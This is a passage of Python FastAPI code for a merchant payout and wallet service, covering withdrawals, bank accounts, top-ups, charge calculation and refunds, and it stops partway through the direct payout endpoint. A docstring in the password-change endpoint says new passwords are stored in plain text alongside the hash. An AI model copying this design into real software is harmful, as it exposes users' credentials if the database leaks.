import calendar
import json
import subprocess
import uuid
from decimal import Decimal, ROUND_HALF_UP

import httpx
from fastapi import  status as http_status
from fastapi import APIRouter, Depends, Query, HTTPException, Form, UploadFile, File, Body
from typing import Optional, List, Dict, Any

from sqlalchemy import or_, and_, func, asc, desc
from sqlalchemy.orm import Session
from datetime import datetime, date

from starlette import status
from starlette.responses import JSONResponse

from crud.merchant import get_self_user_with_wallets, list_my_transactions, get_wallet_transaction_metrics, \
    get_payout_wallet_for_user, create_wallet_transaction, create_transaction_settled, save_file_and_get_url
from crud import admin as admin_crud
from crud.partnerQR import get_txn_by_client_txn_id
from crud.universePayout import HTTP_TIMEOUT_SECONDS, _login, _transfer, BASE_URL
from models.models import PayoutBankAccount, india_tz, TransactionSettled, WalletTransaction, TransactionTypeEnum, \
    credit_debitTypeEnum, DisplayAccount, PayoutTopUp, TopUpStatusEnum, User, MerchantSettings, PayOutWallet, PayOutLog, \
    ProviderCredential
from schemas.merchant import UserSelfOut, PaginatedWalletTransactions, WalletTransactionFilter, PayoutBankAccountOut, \
    PayoutBankAccountCreate, PayoutBankAccountList, WithdrawResponse, WithdrawRequest, TransactionSettledOut, \
    DirectPayoutRequest, MerchantCredentialsOut, MerchantCredentialItem
from utils.authenticate import user_required, get_current_user
from utils.database import get_db
import io
import pandas as pd
from fastapi.responses import StreamingResponse
from datetime import datetime, timedelta

router = APIRouter(dependencies=[Depends(user_required)])

@router.get("/", response_model=UserSelfOut)
def read_self_profile(db: Session = Depends(get_db), current_user = Depends(user_required)):
    """
    Return logged-in user's profile including wallet and payout_wallet.
    """
    user = get_self_user_with_wallets(db, current_user.id)
    if not user:
        raise HTTPException(status_code=404, detail="user not found")
    return user


@router.post("/change-password")
def change_own_password(
    payload: dict = Body(...),
    db: Session = Depends(get_db),
    current_user = Depends(user_required),
):
    """
    Merchant changes own password. Requires old_password verification.
    Saves the new password in both hashed (password) and plain (view_password) columns.
    Body: { "old_password": "...", "new_password": "..." }
    """
    old_password = payload.get("old_password")
    new_password = payload.get("new_password")

    if not new_password or len(new_password) < 6:
        raise HTTPException(status_code=400, detail="new_password must be at least 6 characters")
    if not old_password:
        raise HTTPException(status_code=400, detail="old_password is required")

    try:
        admin_crud.change_password(
            db,
            current_user.id,
            new_password=new_password,
            old_password=old_password,
            verify_old=True,
        )
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    return {"success": True, "message": "Password updated successfully"}

@router.get("/transactions", response_model=PaginatedWalletTransactions)
def read_my_transactions(
    transaction_type: Optional[str] = Query(None),
    credit_debit: Optional[str] = Query(None),
    status: Optional[str] = Query(None),
    min_amount: Optional[float] = Query(None, ge=0),
    max_amount: Optional[float] = Query(None, ge=0),
    date_from: Optional[datetime] = Query(None),
    date_to: Optional[datetime] = Query(None),
    search: Optional[str] = Query(None),
    page: int = Query(1, ge=1),
    per_page: int = Query(20, ge=1, le=500),
    sort_by: str = Query("created_at"),
    sort_desc: bool = Query(True),
    db: Session = Depends(get_db),
    current_user = Depends(user_required)
):
    """
    List transactions for the logged-in user with filters, pagination and sorting.
    """
    # Build filter object (use same WalletTransactionFilter Pydantic)
    filters = WalletTransactionFilter(
        transaction_type = transaction_type,
        credit_debit = credit_debit,
        status = status,
        min_amount = min_amount,
        max_amount = max_amount,
        date_from = date_from,
        date_to = date_to,
        search = search
    )

    items, total = list_my_transactions(
        db=db,
        user_id=current_user.id,
        filters=filters,
        page=page,
        per_page=per_page,
        sort_by=sort_by,
        sort_desc=sort_desc
    )

    return {
        "total": total,
        "page": page,
        "per_page": per_page,
        "items": items
    }


@router.get("/analytics", response_model=Dict[str, Any], summary="Daily series and totals for the current merchant")
def merchant_analytics(
    from_date: Optional[str] = Query(None, description="YYYY-MM-DD; default 6 days before to_date"),
    to_date: Optional[str] = Query(None, description="YYYY-MM-DD; default today"),
    transaction_type: Optional[str] = Query(None),
    status: Optional[str] = Query(None),
    search: Optional[str] = Query(None),
    db: Session = Depends(get_db),
    current_user=Depends(user_required),
):
    """Same shape as /admin/analytics, always scoped to the logged-in merchant."""
    from routers.admin import _analytics, _parse_date_input  # lazy: avoid import cycles

    today = datetime.now(india_tz).date()
    end_dt = _parse_date_input(to_date)
    end = end_dt.date() if end_dt else today
    start_dt = _parse_date_input(from_date)
    start = start_dt.date() if start_dt else end - timedelta(days=6)
    if start > end:
        raise HTTPException(status_code=422, detail="from_date must be <= to_date")
    if (end - start).days > 366:
        raise HTTPException(status_code=422, detail="Range is limited to one year")
    filters = dict(user_id=current_user.id, transaction_type=transaction_type, status=status, search=search)
    cur = _analytics(db, start, end, **filters)
    span = (end - start).days + 1
    prev = _analytics(db, start - timedelta(days=span), start - timedelta(days=1), **filters)
    return {"from_date": start.isoformat(), "to_date": end.isoformat(), **cur, "previous": prev["totals"]}


@router.get("/merchant/metrics", summary="Get metrics for current merchant")
def merchant_wallet_metrics(
    db: Session = Depends(get_db),
    current_user = Depends(user_required),  # returns user object (with id)
):
    """
    Returns payin/payout metrics (today, yesterday, 30_days) for the authenticated merchant.
    """
    if not current_user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    merchant_id = getattr(current_user, "id", None) or getattr(current_user, "user_id", None)
    if not merchant_id:
        raise HTTPException(status_code=400, detail="Cannot resolve current merchant id")

    metrics = get_wallet_transaction_metrics(db, merchant_id=merchant_id, tz_offset_hours=5.5)
    return JSONResponse(content={"merchant_id": merchant_id, "metrics": metrics})


@router.post(
    "/payout-bank-accounts",
    response_model=PayoutBankAccountOut,
    status_code=status.HTTP_201_CREATED,
    summary="Create a payout bank account for the authenticated merchant",
)
def create_payout_bank_account(
    payload: PayoutBankAccountCreate,
    db: Session = Depends(get_db),
    current_user = Depends(user_required),
):
    if not current_user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    user_id = getattr(current_user, "id", None) or getattr(current_user, "user_id", None)
    if not user_id:
        raise HTTPException(status_code=400, detail="Cannot resolve current user id")

    # Duplicate check
    existing = (
        db.query(PayoutBankAccount)
        .filter(PayoutBankAccount.user_id == user_id)
        .filter(PayoutBankAccount.account_number == payload.account_number)
        .filter(PayoutBankAccount.ifsc_code == payload.ifsc_code)
        .first()
    )
    if existing:
        raise HTTPException(
            status_code=status.HTTP_409_CONFLICT,
            detail="A payout bank account with the same account number and IFSC already exists for this user.",
        )

    record = PayoutBankAccount(
        user_id=user_id,
        account_holder_name=payload.account_holder_name.strip(),
        account_number=payload.account_number,
        ifsc_code=payload.ifsc_code,
        bank_name=(payload.bank_name.strip() if payload.bank_name else None),
        bank_branch=(payload.bank_branch.strip() if payload.bank_branch else None),
        account_type=(payload.account_type.strip() if payload.account_type else None),
        bank_address=(payload.bank_address.strip() if payload.bank_address else None),
        is_validate=False,
    )

    try:
        db.add(record)
        db.commit()
        db.refresh(record)
    except Exception:
        db.rollback()
        raise HTTPException(status_code=500, detail="Failed to create payout bank account")

    # ------- robust serialization: support both pydantic v2 and v1 -------
    try:
        # pydantic v2 approach (preferred if using v2)
        if hasattr(PayoutBankAccountOut, "model_validate"):
            model_instance = PayoutBankAccountOut.model_validate(record)
            content = model_instance.model_dump()  # pydantic v2
        else:
            # fallback to v1 from_orm
            model_instance = PayoutBankAccountOut.from_orm(record)
            content = model_instance.dict()
    except Exception:
        # As a last-resort safe fallback, build dict manually (explicit fields)
        content = {
            "id": record.id,
            "user_id": record.user_id,
            "account_holder_name": record.account_holder_name,
            "account_number": record.account_number,
            "ifsc_code": record.ifsc_code,
            "bank_name": record.bank_name,
            "bank_branch": record.bank_branch,
            "account_type": record.account_type,
            "bank_address": record.bank_address,
            "is_validate": bool(record.is_validate),
        }

    return JSONResponse(status_code=status.HTTP_201_CREATED, content=content)

@router.get(
    "/payout-bank-accounts",
    response_model=PayoutBankAccountList,
    summary="List payout bank accounts for the authenticated merchant",
)
def list_payout_bank_accounts(
    db: Session = Depends(get_db),
    current_user = Depends(user_required),
    is_validate: Optional[bool] = Query(None, description="If provided, filter by validation state"),
    limit: int = Query(100, ge=1, le=1000, description="Max number of records to return"),
    offset: int = Query(0, ge=0, description="Offset for pagination"),
):
    """
    Return payout bank accounts belonging to the authenticated user.

    Query params:
    - is_validate: optional bool to filter only validated/unvalidated accounts
    - limit, offset: pagination controls
    """
    if not current_user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    user_id = getattr(current_user, "id", None) or getattr(current_user, "user_id", None)
    if not user_id:
        raise HTTPException(status_code=400, detail="Cannot resolve current user id")

    q = db.query(PayoutBankAccount).filter(PayoutBankAccount.user_id == user_id)
    if is_validate is not None:
        q = q.filter(PayoutBankAccount.is_validate == bool(is_validate))

    total = q.count()
    items = q.order_by(PayoutBankAccount.id.desc()).offset(offset).limit(limit).all()

    return {"total": total, "items": items}


@router.get(
    "/payout-bank-accounts/{account_id}",
    response_model=PayoutBankAccountOut,
    summary="Get a single payout bank account for the authenticated merchant",
)
def get_payout_bank_account(
    account_id: int,
    db: Session = Depends(get_db),
    current_user = Depends(user_required),
):
    """
    Return a single payout bank account by id, only if it belongs to the authenticated user.
    """
    if not current_user:
        raise HTTPException(status_code=401, detail="Unauthorized")

    user_id = getattr(current_user, "id", None) or getattr(current_user, "user_id", None)
    if not user_id:
        raise HTTPException(status_code=400, detail="Cannot resolve current user id")

    record = (
        db.query(PayoutBankAccount)
        .filter(PayoutBankAccount.id == account_id)
        .filter(PayoutBankAccount.user_id == user_id)
        .first()
    )

    if not record:
        raise HTTPException(status_code=404, detail="Payout bank account not found")

    return record


MIN_WITHDRAW_AMOUNT = 100.0


@router.post("/withdraw", response_model=WithdrawResponse)
def merchant_withdraw(payload: WithdrawRequest, db: Session = Depends(get_db), current_user = Depends(user_required)):
    user_id = current_user.id

    payout_wallet = get_payout_wallet_for_user(db, user_id)
    if not payout_wallet:
        raise HTTPException(status_code=400, detail="Payout wallet not found")

    amount = float(payload.amount)
    if amount < MIN_WITHDRAW_AMOUNT:
        raise HTTPException(status_code=400, detail=f"Minimum withdrawal is ₹{MIN_WITHDRAW_AMOUNT:,.0f}")
    if payout_wallet.balance < amount:
        raise HTTPException(status_code=400, detail="Insufficient payout wallet balance")

    # Only the merchant's own, admin-verified accounts can receive a withdrawal
    try:
        bank_account_id = int(str(payload.bank_account_id).strip())
    except (TypeError, ValueError):
        raise HTTPException(status_code=400, detail="Invalid bank account")
    account = (
        db.query(PayoutBankAccount)
        .filter(PayoutBankAccount.id == bank_account_id, PayoutBankAccount.user_id == user_id)
        .first()
    )
    if not account:
        raise HTTPException(status_code=404, detail="Bank account not found")
    if not account.is_validate:
        raise HTTPException(status_code=400, detail="This bank account is still awaiting admin verification")

    try:
        # Use the existing transaction (don't call db.begin() if one is already active)
        payout_wallet.balance = float(payout_wallet.balance) - amount
        payout_wallet.last_updated = datetime.now(india_tz)
        db.add(payout_wallet)
        txn_id = f"SETTLE-{uuid.uuid4().hex[:12].upper()}"
        wt  = WalletTransaction(
            user_id=user_id,
            order_id = txn_id,
            transaction_type=TransactionTypeEnum.PayOut,
            credit_debit=credit_debitTypeEnum.debit,
            amount=float(amount),
            description=f"Payout to bank account {payload.bank_account_id}",
            reference_id=str(bank_account_id),
            status="pending",
            created_at=datetime.now(india_tz),
            )

        ts = TransactionSettled(
            txn_id=txn_id,
            amount=float(amount),
            status="pending",
            txn_type="debit",
            settled_date=datetime.now(india_tz),
            created_date=datetime.now(india_tz),
            user_id=user_id
        )
        db.add(ts)
        db.add(wt)

        # If get_db commits after request, fine. Otherwise commit here:
        db.commit()   # only call commit if your dependency does NOT commit automatically
        db.refresh(ts)
        db.refresh(wt)
        return WithdrawResponse(success=True, message="Withdraw request created", wallet_transaction_id=wt.id, transaction_settled_id=ts.id)
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Error creating withdraw: {str(e)}")



@router.get("/settled", response_model=List[TransactionSettledOut])
def list_transaction_settled(db: Session = Depends(get_db), current_user = Depends(user_required),
                             page: int = Query(1, ge=1), per_page: int = Query(20, ge=1, le=200),
                             status: Optional[str] = None):
    q = db.query(TransactionSettled).filter(TransactionSettled.user_id == current_user.id)
    if status:
        q = q.filter(TransactionSettled.status == status)
    q = q.order_by(TransactionSettled.created_date.desc())
    items = q.offset((page-1)*per_page).limit(per_page).all()
    return items


@router.get("/settlements", response_model=Dict[str, Any], summary="Withdrawal requests with bank account and counts")
def list_my_settlements(
    db: Session = Depends(get_db),
    current_user=Depends(user_required),
    page: int = Query(1, ge=1),
    per_page: int = Query(10, ge=1, le=100),
    status: Optional[str] = Query(None, description="pending | success | failed"),
):
    """
    The merchant's withdrawal requests (debit settlements), newest first, each with the
    bank account it was sent to (from the matching wallet transaction), plus status counts.
    """
    base = db.query(TransactionSettled).filter(
        TransactionSettled.user_id == current_user.id, TransactionSettled.txn_type == "debit"
    )
    counts = {st: int(c) for st, c in base.with_entities(TransactionSettled.status, func.count(TransactionSettled.id)).group_by(TransactionSettled.status).all()}
    q = base.filter(TransactionSettled.status == status) if status else base
    total = q.count()
    rows = q.order_by(TransactionSettled.created_date.desc()).offset((page - 1) * per_page).limit(per_page).all()

    # withdraw() stores the settlement id as the wallet txn's order_id and the bank account id as reference_id
    wts = {
        w.order_id: w
        for w in db.query(WalletTransaction)
        .filter(WalletTransaction.user_id == current_user.id, WalletTransaction.order_id.in_([r.txn_id for r in rows] or [""]))
        .all()
    }
    acc_ids = set()
    for w in wts.values():
        try:
            acc_ids.add(int(str(w.reference_id).strip()))
        except (TypeError, ValueError):
            pass
    accounts = {
        a.id: a
        for a in db.query(PayoutBankAccount)
        .filter(PayoutBankAccount.user_id == current_user.id, PayoutBankAccount.id.in_(list(acc_ids) or [-1]))
        .all()
    }

    items = []
    for r in rows:
        w = wts.get(r.txn_id)
        acc = None
        if w is not None:
            try:
                acc = accounts.get(int(str(w.reference_id).strip()))
            except (TypeError, ValueError):
                acc = None
        items.append({
            "id": r.id,
            "txn_id": r.txn_id,
            "amount": r.amount,
            "status": r.status,
            "requested_at": r.created_date.isoformat() if r.created_date else None,
            # settled_date is written at request time, so only report it once the request is done
            "settled_at": None if r.status == "pending" else (r.settled_date.isoformat() if r.settled_date else None),
            "utr": getattr(w, "utr", None) if w else None,
            "bank_account": {
                "id": acc.id,
                "bank_name": acc.bank_name,
                "last4": (acc.account_number or "")[-4:],
                "holder": acc.account_holder_name,
                "ifsc": acc.ifsc_code,
            } if acc else None,
        })

    return {
        "total": total,
        "page": page,
        "per_page": per_page,
        "items": items,
        "stats": {
            "total": sum(counts.values()),
            "completed": counts.get("success", 0),
            "pending": counts.get("pending", 0),
            "rejected": counts.get("failed", 0),
        },
        "min_amount": MIN_WITHDRAW_AMOUNT,
    }


@router.get("/display-accounts")
def get_display_accounts(db: Session = Depends(get_db)):
    # only return validated accounts
    return db.query(DisplayAccount).filter_by(is_validate=True).all()

@router.post("/topup_submit")
async def submit_topup(
    amount: float = Form(...),
    beneficiary_account_id: int = Form(...),
    payer_account_number: str = Form(None),
    payer_name: str = Form(None),
    utr_or_txn_id: str = Form(None),
    reference_note: str = Form(None),
    receipt: UploadFile | None = File(None),
    current_user = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    # check beneficiary exists and is validated
    acct = db.get(DisplayAccount, beneficiary_account_id)
    if not acct or not acct.is_validate:
        raise HTTPException(400, "Selected beneficiary is invalid or not available")

    receipt_url = None
    receipt_mime = None
    if receipt:
        receipt_url = await save_file_and_get_url(receipt, subfolder="topup_receipts")
        receipt_mime = receipt.content_type

    topup = PayoutTopUp(
        user_id=current_user.id,
        amount=float(amount),
        payer_account_number=payer_account_number,
        payer_name=payer_name,
        beneficiary_account_number=acct.beneficiary_account_number,
        beneficiary_ifsc=acct.beneficiary_ifsc,
        beneficiary_bank_name=acct.beneficiary_bank_name,
        utr_or_txn_id=utr_or_txn_id,
        reference_note=reference_note,
        receipt_url=receipt_url,
        receipt_mime=receipt_mime,
        status="pending"
    )
    db.add(topup)
    db.commit()
    db.refresh(topup)
    return {"success": True, "data": {"id": topup.id, "status": topup.status}}


def _serialize_topup_for_user(t):
    """Return a plain dict suitable for JSON response (no password fields)."""
    return {
        "id": t.id,
        "user_id": t.user_id,
        "payer_name": t.payer_name,
        "payer_account_number": t.payer_account_number,
        "payer_vpa_or_number": t.payer_vpa_or_number,
        "payer_bank_name": t.payer_bank_name,
        "beneficiary_account_number": t.beneficiary_account_number,
        "beneficiary_ifsc": t.beneficiary_ifsc,
        "beneficiary_bank_name": t.beneficiary_bank_name,
        "amount": t.amount,
        "instrument": t.instrument.value if hasattr(t.instrument, "value") else str(t.instrument),
        "utr_or_txn_id": t.utr_or_txn_id,
        "reference_note": t.reference_note,
        "receipt_url": t.receipt_url,
        "receipt_mime": t.receipt_mime,
        "status": t.status.value if hasattr(t.status, "value") else str(t.status),
        "admin_notes": t.admin_notes,
        "verified_by": t.verified_by,
        "verified_at": t.verified_at.isoformat() if t.verified_at else None,
        "created_at": t.created_at.isoformat() if t.created_at else None,
        "updated_at": t.updated_at.isoformat() if t.updated_at else None,
    }

@router.get("/topups-list")
def topups_list(
    page: int = Query(1, ge=1),
    per_page: int = Query(20, ge=1, le=500),
    status: Optional[TopUpStatusEnum] = Query(None),
    db: Session = Depends(get_db),
    current_user = Depends(get_current_user),
):
    """
    Paginated list of topups for the logged-in user.
    Returns: { total, page, per_page, items: [...] }
    Optional query param: ?status=pending|verified|failed|cancelled
    """
    # Base query restricted to this user
    q = db.query(PayoutTopUp).filter(PayoutTopUp.user_id == current_user.id)

    # Optional status filter
    if status is not None:
        q = q.filter(PayoutTopUp.status == status)

    # total count (cheap enough for normal usage)
    total = q.count()

    # pagination + ordering (newest first)
    items = q.order_by(PayoutTopUp.created_at.desc()) \
             .offset((page - 1) * per_page) \
             .limit(per_page) \
             .all()

    # serialize to plain JSON-friendly dicts
    serialized = [_serialize_topup_for_user(i) for i in items]

    return {"total": total, "page": page, "per_page": per_page, "items": serialized}










# ---------- helpers ----------
# def _compute_payout_charges(amount: Decimal, payOutCharges: Optional[float]) -> tuple[Decimal, Decimal, Decimal]:
#     if payOutCharges is None:
#         p = Decimal("0")
#     else:
#         p = Decimal(str(payOutCharges))
#     charges = Decimal("0.00")
#     if p <= Decimal("1"):
#         charges = (amount * p).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#     elif p <= Decimal("100"):
#         charges = (amount * (p / Decimal("100"))).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#     else:
#         charges = p.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#
#     gst = (charges * Decimal("0.18")).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#     net_to_beneficiary = amount
#     return charges, gst, net_to_beneficiary

def _compute_payout_charges(
    amount: Decimal,
    payOutCharges: Optional[float] = None,
    payOutChargesFlat: Optional[float] = None,
) -> tuple[Decimal, Decimal, Decimal]:
    """
    Compute charges, gst and net_to_beneficiary.

    Priority changed:
    1) If payOutCharges is provided and > 0 -> use it (as decimal multiplier / percent / flat per previous semantics).
    2) Else if payOutChargesFlat is provided -> treat as flat INR charge.
    3) Else -> zero charges.

    payOutCharges interpretation:
      - <= 1    : decimal multiplier (eg 0.02)
      - >1 <=100: percent (eg 1.5 -> 1.5%)
      - >100    : flat rupee value
    """
    # sanitize inputs
    p = None
    if payOutCharges is not None:
        try:
            p = Decimal(str(payOutCharges))
        except Exception:
            p = None

    p_flat = None
    if payOutChargesFlat is not None:
        try:
            p_flat = Decimal(str(payOutChargesFlat))
        except Exception:
            p_flat = None

    charges = Decimal("0.00")

    # Primary: use payOutCharges if provided and > 0
    if p is not None and p != Decimal("0"):
        # Use p according to magnitude
        try:
            if p <= Decimal("1"):
                # decimal multiplier, e.g. 0.02
                charges = (amount * p).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
            elif p <= Decimal("100"):
                # percent value e.g., 1.5 -> 1.5%
                charges = (amount * (p / Decimal("100"))).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
            else:
                # >100 treat as flat rupee value
                charges = p.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
        except Exception:
            charges = Decimal("0.00")
    else:
        # Fallback: use explicit flat payout if provided
        if p_flat is not None:
            # treat p_flat as flat INR charge (no upper/lower special-case)
            charges = p_flat.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
        else:
            charges = Decimal("0.00")

    gst = (charges * Decimal("0.18")).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
    net_to_beneficiary = amount  # unchanged by charges (amount is what beneficiary receives)

    return charges, gst, net_to_beneficiary

#mid switch kar parambvasu M23NW5UH6RKHX ka afg me aur afg ka paramavau AHGONLINE
# def _compute_payout_charges(
#     amount: Decimal,
#     payOutCharges: Optional[float] = None,
#     payOutChargesFlat: Optional[float] = None,
# ) -> tuple[Decimal, Decimal, Decimal]:
#     """
#     Compute charges, gst and net_to_beneficiary.
#
#     New logic:
#     - If payOutChargesFlat is provided AND <= 1000 -> treat it as a flat INR charge.
#     - Otherwise use the previous payOutCharges semantics:
#         * payOutCharges <= 1      : decimal multiplier (e.g. 0.02)
#         * payOutCharges <= 100    : percent (e.g. 2)
#         * payOutCharges > 100     : flat rupee value
#     """
#     # sanitize inputs
#     p_flat = None
#     if payOutChargesFlat is not None:
#         try:
#             p_flat = Decimal(str(payOutChargesFlat))
#         except Exception:
#             p_flat = None
#
#     p = None
#     if payOutCharges is not None:
#         try:
#             p = Decimal(str(payOutCharges))
#         except Exception:
#             p = None
#
#     charges = Decimal("0.00")
#
#     # Priority: explicit flat limit via payOutChargesFlat
#     if p_flat is not None and p_flat <= Decimal("1000"):
#         # treat p_flat as flat INR charge
#         charges = p_flat.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#     else:
#         # fallback to previous logic using payOutCharges
#         if p is None:
#             p = Decimal("0")
#
#         if p <= Decimal("1"):
#             # decimal multiplier e.g., 0.02
#             charges = (amount * p).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#         elif p <= Decimal("100"):
#             # percent value e.g., 2 -> 2%
#             charges = (amount * (p / Decimal("100"))).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#         else:
#             # >100 treat as flat rupee value
#             charges = p.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#
#     gst = (charges * Decimal("0.18")).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
#     net_to_beneficiary = amount  # unchanged by charges (amount is what beneficiary receives)
#     return charges, gst, net_to_beneficiary


def _normalize_upstream_status(raw: Any) -> str:
    """
    Return one of: 'success', 'failed', 'inprogress', or '' (unknown).
    """
    if not isinstance(raw, dict):
        return ""

    nested = raw.get("data", {}).get("data", {}).get("status")
    if isinstance(nested, str) and nested.strip():
        s = nested.strip().lower()
        if s in {"completed", "complete", "success", "succeeded", "successful", "initiated"}:
            return "success"
        if s in {"failure", "failed", "error", "rejected"}:
            return "failed"
        if s in {"inprogress", "in_progress", "in progress", "processing", "pending", "started"}:
            return "inprogress"
        return s

    data_block = raw.get("data")
    if isinstance(data_block, dict) and isinstance(data_block.get("success"), bool):
        return "success" if data_block.get("success") else "failed"

    top_status = raw.get("status")
    if isinstance(top_status, bool):
        return "success" if top_status else "failed"

    return ""


def _extract_up_txn_identifier(raw: Any) -> str:
    if not isinstance(raw, dict):
        return ""
    candidates = [
        ("data", "data", "orderId"),
        ("data", "data", "transactionId"),
        ("data", "data", "transactionId".lower()),
        ("data", "txn"),
        ("data", "txn_id"),
        ("txn_id",),
        ("transactionId",),
        ("orderId",),
    ]
    for path in candidates:
        cur = raw
        ok = True
        for k in path:
            if isinstance(cur, dict) and k in cur:
                cur = cur[k]
            else:
                ok = False
                break
        if ok and cur:
            return str(cur)
    return ""



def _debit_from_payout_wallet(db: Session, payout_wallet: PayOutWallet, order_id: str,
                              amount: Decimal, charges: Decimal, gst: Decimal, total_debit: Decimal,
                              upstream_order_id: Optional[str], upstream_raw: Any, status_to_set: str = "InProgress"):
    """
    Deduct total_debit from payout_wallet and update/create WalletTransaction entry with actual settle/charges/gst.
    This should be atomic as written (db commit/rollback inside).
    """
    try:
        # re-fetch fresh objects under transaction
        pw = db.query(PayOutWallet).filter(PayOutWallet.user_id == payout_wallet.user_id).with_for_update().first()
        if not pw:
            raise HTTPException(status_code=404, detail="Payout wallet not found at debit time")

        if Decimal(str(pw.balance)) < total_debit:
            raise HTTPException(status_code=400, detail="Insufficient funds in payout wallet when finalizing debit")

        pw.balance = float((Decimal(str(pw.balance)) - total_debit).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP))
        if hasattr(pw, "last_updated"):
            pw.last_updated = datetime.now(india_tz)
        db.add(pw)

        tx_row = db.query(WalletTransaction).filter(WalletTransaction.order_id == order_id).first()
        if not tx_row:
            # create a new debit row if initial one is missing
            tx_row = WalletTransaction(
                user_id=pw.user_id,
                transaction_type=TransactionTypeEnum.PayOut,
                credit_debit=credit_debitTypeEnum.debit,
                order_id=order_id,
                amount=float(amount),
                charges=float(charges),
                gst=float(gst),
                settle_amount=float(total_debit),
                balance_amount=float(pw.balance),
                status=status_to_set,
                description=f"Payout debit (finalized) - upstream: {upstream_order_id}",
                created_at=datetime.now(india_tz),
                api_name="universepay.direct",
            )
        else:
            tx_row.charges = float(charges)
            tx_row.gst = float(gst)
            tx_row.settle_amount = float(total_debit)
            tx_row.balance_amount = float(pw.balance)
            tx_row.status = status_to_set
            if upstream_order_id:
                tx_row.txn_id = upstream_order_id
        db.add(tx_row)

        # update PayOutLog if present
        try:
            log = db.query(PayOutLog).filter(PayOutLog.order_id == order_id).first()
            if log:
                log.response_payload = json.dumps(upstream_raw, ensure_ascii=False)
                log.status = status_to_set
                log.updated_at = datetime.now(india_tz)
                db.add(log)
        except Exception:
            pass

        db.commit()
    except HTTPException:
        db.rollback()
        raise
    except Exception as exc:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Error debiting payout wallet: {str(exc)}")


def _refund_to_payout_wallet_if_needed(db: Session, payout_wallet: PayOutWallet, original_order_id: str,
                                       refund_amount: Decimal, refund_charges: Decimal, refund_gst: Decimal,
                                       upstream_raw: Any):
    """
    Create a refund credit transaction and credit the payout wallet. This is called only when a debit had
    previously been performed and we must refund that earlier debit.
    """
    try:
        pw = db.query(PayOutWallet).filter(PayOutWallet.user_id == payout_wallet.user_id).with_for_update().first()
        if not pw:
            raise HTTPException(status_code=404, detail="Payout wallet not found at refund time")

        # credit wallet
        new_balance = (Decimal(str(pw.balance)) + refund_amount).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
        pw.balance = float(new_balance)
        if hasattr(pw, "last_updated"):
            pw.last_updated = datetime.now(india_tz)
        db.add(pw)

        # create a new positive (credit) WalletTransaction representing the refund
        refund_txn = WalletTransaction(
            user_id=pw.user_id,
            transaction_type=TransactionTypeEnum.LiveRefund,
            credit_debit=credit_debitTypeEnum.credit,
            order_id=f"REFUND-{original_order_id}",
            amount=float(refund_amount),
            charges=0.0,
            gst=0.0,
            settle_amount=float(refund_amount),
            balance_amount=float(pw.balance),
            status="success",
            description=f"Refund for failed payout {original_order_id}",
            reference_id=None,
            instrument_mode=None,
            api_name="system.refund",
            created_at=datetime.now(india_tz),
        )
        db.add(refund_txn)

        # zero original tx fields (mark failed)
        orig = db.query(WalletTransaction).filter(WalletTransaction.order_id == original_order_id).first()
        if orig:
            orig.settle_amount = 0.0
            orig.charges = 0.0
            orig.gst = 0.0
            orig.status = "failed"
            db.add(orig)

        # update PayOutLog if present
        try:
            log = db.query(PayOutLog).filter(PayOutLog.order_id == original_order_id).first()
            if log:
                log.response_payload = json.dumps(upstream_raw, ensure_ascii=False)
                log.status = "failed-refunded"
                log.updated_at = datetime.now(india_tz)
                db.add(log)
        except Exception:
            pass

        db.commit()
    except HTTPException:
        db.rollback()
        raise
    except Exception as exc:
        db.rollback()
        raise HTTPException(status_code=500, detail=f"Error refunding payout wallet: {str(exc)}")
# Replace the existing payout_direct with this implementation

@router.post("/payout/direct", response_model=Dict[str, Any])
async def payout_direct(
    req: DirectPayoutRequest = Body(...),
    db: Session = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    # ---------- validations ----------
    if req.orderId:
        if get_txn_by_client_txn_id(db, req.orderId):
            raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail="orderId already exists")

    try:
        amount = Decimal(req.amount).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
        if amount <= 0:
            raise ValueError("Amount must be > 0")
    except Exception:
        raise HTTPException(status_code=422, detail="Invalid amount")

    if not isinstance(req.ifsc, str) or len(req.ifsc.strip()) != 11:
        raise HTTPException(status_code=422, detail="IFSC must be an 11-character code")
    if not str(req.accountno).strip().isdigit():
        raise HTTPException(status_code=422, detail="Account number must be numeric")

    # ---------- compute expected charges / totals ----------
    settings = db.query(MerchantSettings).filter(MerchantSettings.id == current_user.id).first()
    payOutCharges_val = settings.payOutCharges if settings else None
    payOutChargesFlat_val = settings.payOutChargesFlat if settings else None

    expected_charges, expected_gst, _ = _compute_payout_charges(
        amount,
        payOutCharges=payOutCharges_val,
        payOutChargesFlat=payOutChargesFlat_val,
    )
    expected_settle = (amount + expected_charges + expected_gst).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)

    payout_wallet = db.query(PayOutWallet).filter(PayOutWallet.user_id == current_user.id).first()
    if not payout_wallet:
        raise HTTPException(status_code=404, detail="Payout wallet not found for user")

    # If you want to deny requests where wallet doesn't have funds even to be initiated,
    # uncomment the check below. Otherwise, we allow initiation and decide debit later.
    # if Decimal(str(payout_wallet.balance)) < expected_settle:
    #     raise HTTPException(status_code=400, detail="Insufficient funds in payout wallet to cover amount + charges + GST")

